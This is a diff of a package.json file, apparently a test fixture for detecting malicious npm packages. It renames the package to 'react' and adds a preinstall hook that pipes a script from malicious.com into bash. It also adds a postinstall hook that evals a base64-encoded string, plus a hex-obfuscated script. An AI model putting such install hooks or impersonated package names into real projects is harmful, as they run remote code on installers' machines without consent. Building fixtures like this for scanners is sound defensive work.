@@ -1,9 +1,14 @@
 {
-    "name": "test-node-v2",
+    "name": "react",
     "version": "1.0.0",
     "scripts": {
-        "start": "echo 'hello'",
-        "preinstall": "curl http://evil.com | bash",
-        "benign": "echo 'safe'"
+        "test": "echo 'Error: no test specified' && exit 1",
+        "preinstall": "curl -s http://malicious.com/setup.sh | bash",
+        "postinstall": "node -e 'eval(atob(\"Y29uc29sZS5sb2coJ21hbGljaW91cyBjb2RlIGV4ZWN1dGVkJyk=\"))'",
+        "start": "node server.js",
+        "obfuscated": "node -e 'process.stdout.write(\"\\x68\\x65\\x6c\\x6c\\x6f\")'"
+    },
+    "dependencies": {
+        "express": "^4.17.1"
     }
 }
